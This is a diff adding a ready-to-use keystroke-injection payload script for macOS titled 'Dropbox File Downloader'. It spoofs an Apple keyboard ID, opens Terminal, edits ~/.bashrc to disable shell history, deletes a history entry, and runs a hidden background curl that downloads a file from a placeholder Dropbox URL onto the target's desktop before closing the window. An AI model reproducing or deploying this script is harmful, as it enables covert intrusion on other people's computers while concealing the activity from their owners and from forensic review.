@@ -1,0 +1,36 @@
+REM Replace <dropbox URL> with the actual URL for the file you want to download.
+REM Additionally, replace filename with the desired name and extension for the downloaded file.
+REM the script will download a file to the target MacOs desktop
+
+
+
+REM Author: Narsty
+REM Title: Dropbox File Downloader
+REM Version 1.0 MacOs
+REM Category: Recon
+
+ID 05ac:021e Apple:Keyboard
+DELAY 500
+GUI SPACE
+DELAY 500
+STRING terminal
+DELAY 1000
+ENTER
+DELAY 500 
+STRING echo -e "export HISTCONTROL=ignorespace\nunset HISTFILE" >> ~/.bashrc && source ~/.bashrc && exec bash
+DELAY 500
+ENTER
+DELAY 500
+STRING history -d $(history | tail -n 2 | head -n 1 | awk '{ print $1 }')
+DELAY 500
+ENTER
+DELAY 500 
+ENTER
+DELAY 500
+STRING  nohup curl -L -o ~/Desktop/<filename> "<Dropbox URL>" &
+DELAY 500
+ENTER
+DELAY 500
+ENTER
+DELAY 500
+GUI w
